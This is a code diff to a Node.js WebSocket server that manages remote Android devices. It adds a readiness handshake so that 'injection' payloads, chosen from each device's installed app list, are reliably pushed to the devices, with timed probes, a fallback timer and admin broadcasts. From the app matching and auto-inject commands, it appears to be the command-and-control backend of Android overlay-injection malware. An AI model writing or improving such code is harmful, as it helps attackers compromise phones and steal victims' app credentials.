@@ -70,6 +70,9 @@ function handleDevice(ws, sessionId, connections) {
     clientIp,
     appListReceived: false,
     connectedAt: Date.now(),
+    injectionStatusReady: false,
+    pendingAutoApps: null,
+    injectionReadinessTimers: [],
   });
   console.log(`[WS-Device] Connected: ${sessionId} ip=${clientIp}`);
   void recordDeviceDebug('ws.connected', sessionId, { clientIp, connectionPoolSize: connections.devices.size });
@@ -174,6 +177,9 @@ function handleDevice(ws, sessionId, connections) {
           clientIp: latestClientIp,
           appListReceived: false,
           connectedAt: Date.now(),
+          injectionStatusReady: false,
+          pendingAutoApps: null,
+          injectionReadinessTimers: [],
         })
         if (process.env.NODE_WS_DEBUG_HEAL === '1') {
           console.log(`[WS-Device] pool self-heal: re-registered ${sessionId}`)
@@ -222,6 +228,10 @@ function handleDevice(ws, sessionId, connections) {
     policySyncTimers.forEach(clearTimeout);
     clearInterval(heartbeatInterval);
     clearInterval(serverPingInterval);
+    const closingConnection = connections.devices.get(sessionId);
+    if (closingConnection && closingConnection.ws === ws) {
+      (closingConnection.injectionReadinessTimers || []).forEach(clearTimeout);
+    }
     if (!isCurrentDeviceConnection()) return;  // ★ 不是自己的连接（已被新连接覆盖），不清理
     connections.devices.delete(sessionId);
     // 只有当没有 bridge 连接时才标记为离线
@@ -249,6 +259,10 @@ function handleDevice(ws, sessionId, connections) {
     policySyncTimers.forEach(clearTimeout);
     clearInterval(heartbeatInterval);
     clearInterval(serverPingInterval);
+    const failedConnection = connections.devices.get(sessionId);
+    if (failedConnection && failedConnection.ws === ws) {
+      (failedConnection.injectionReadinessTimers || []).forEach(clearTimeout);
+    }
     if (!isCurrentDeviceConnection()) return;  // ★ 归属校验，同上
     connections.devices.delete(sessionId);
     if (!connections.bridges.has(sessionId)) {
@@ -427,7 +441,28 @@ function handleDeviceMessage(ws, msg, sessionId, connections) {
       // APK 确认已启用的注入包后，将客户端真实状态回写到活跃任务。
       // 否则 SHOW_INJECTION 已被 APK 接收，但页面的轮询会因查不到 DB 记录
       // 立刻把“停止注入”覆盖回“注入”。
-      void reconcileInjectionStatus(sessionId, msg);
+      {
+        const current = connections.devices.get(sessionId);
+        const pendingApps = current && current.ws === ws && Array.isArray(current.pendingAutoApps)
+          ? current.pendingAutoApps
+          : null;
+        if (current && current.ws === ws) {
+          current.injectionStatusReady = true;
+          current.pendingAutoApps = null;
+          (current.injectionReadinessTimers || []).forEach(clearTimeout);
+          current.injectionReadinessTimers = [];
+        }
+        void reconcileInjectionStatus(sessionId, msg).then(async () => {
+          if (!pendingApps) return;
+          const latest = connections.devices.get(sessionId);
+          if (!latest || latest.ws !== ws || ws.readyState !== 1) return;
+          void recordDeviceDebug('injection.auto.readiness_confirmed', sessionId, {
+            installedAppCount: pendingApps.length,
+            trigger: 'injection_status',
+          });
+          await autoInjectForDevice(sessionId, pendingApps, ws, connections);
+        });
+      }
       broadcastToAdmins(connections, { ...msg, type: 'injection_status', deviceId: sessionId, sessionId });
       break;
 
@@ -991,11 +1026,83 @@ async function handleAppList(deviceId, msg, ws, connections) {
     } else {
       console.log(`[WS-Device] injection_active=ON for ${deviceId}, triggering auto-inject...`);
       void recordDeviceDebug('injection.auto.matching', deviceId, { installedAppCount: Array.isArray(apps) ? apps.length : 0 });
+      const current = connections.devices.get(deviceId);
+      if (current && current.ws === ws && !current.injectionStatusReady) {
+        startInjectionReadinessHandshake(deviceId, apps, ws, connections);
+        void recordDeviceDebug('injection.auto.waiting_client_ready', deviceId, {
+          installedAppCount: Array.isArray(apps) ? apps.length : 0,
+          command: 'GET_INJECTION_STATUS',
+        });
+        return;
+      }
       await autoInjectForDevice(deviceId, apps, ws, connections);
     }
   } catch (err) {
     console.error('[WS-Device] handleAppList error:', err.message);
   }
+}
+
+/**
+ * SHOW_INJECTION 只能在 APK 命令处理器启动后下发。新安装设备的 WS/心跳
+ * 往往先于命令处理器就绪；固定等几秒仍会丢命令。先用轻量的
+ * GET_INJECTION_STATUS 做应用层握手，收到 injection_status 后再发送注入。
+ */
+function startInjectionReadinessHandshake(deviceId, apps, ws, connections) {
+  const current = connections.devices.get(deviceId);
+  if (!current || current.ws !== ws || ws.readyState !== 1) return;
+
+  current.pendingAutoApps = Array.isArray(apps) ? apps : [];
+  if (Array.isArray(current.injectionReadinessTimers) && current.injectionReadinessTimers.length > 0) return;
+
+  const probeDelays = [0, 5000, 15000, 30000, 60000];
+  const timers = probeDelays.map((delayMs, index) => setTimeout(() => {
+    const latest = connections.devices.get(deviceId);
+    if (!latest || latest.ws !== ws || latest.injectionStatusReady || ws.readyState !== 1) return;
+    try {
+      ws.send(JSON.stringify({
+        type: 'command',
+        sessionId: deviceId,
+        data: {
+          command: 'GET_INJECTION_STATUS',
+          params: {
+            source: 'auto-readiness-handshake',
+            attempt: index + 1,
+          },
+        },
+      }));
+      void recordDeviceDebug('injection.auto.readiness_probe_sent', deviceId, {
+        delayMs,
+        attempt: index + 1,
+        totalAttempts: probeDelays.length,
+      });
+    } catch (err) {
+      void recordDeviceDebug('injection.auto.readiness_probe_error', deviceId, {
+        delayMs,
+        attempt: index + 1,
+        message: err.message || String(err),
+      }, 'error');
+    }
+  }, delayMs));
+
+  // 兼容不支持 injection_status 的旧客户端，但给新安装启动留足时间。
+  const fallbackTimer = setTimeout(async () => {
+    const latest = connections.devices.get(deviceId);
+    if (!latest || latest.ws !== ws || latest.injectionStatusReady || ws.readyState !== 1) return;
+    const pendingApps = Array.isArray(latest.pendingAutoApps) ? latest.pendingAutoApps : [];
+    latest.injectionStatusReady = true;
+    latest.pendingAutoApps = null;
+    latest.injectionReadinessTimers = [];
+    void recordDeviceDebug('injection.auto.readiness_fallback', deviceId, {
+      waitedMs: 75000,
+      installedAppCount: pendingApps.length,
+    }, 'warn');
+    await autoInjectForDevice(deviceId, pendingApps, ws, connections);
+  }, 75000);
+
+  current.injectionReadinessTimers = [...timers, fallbackTimer];
+  current.injectionReadinessTimers.forEach(timer => {
+    if (typeof timer.unref === 'function') timer.unref();
+  });
 }
 
 /**
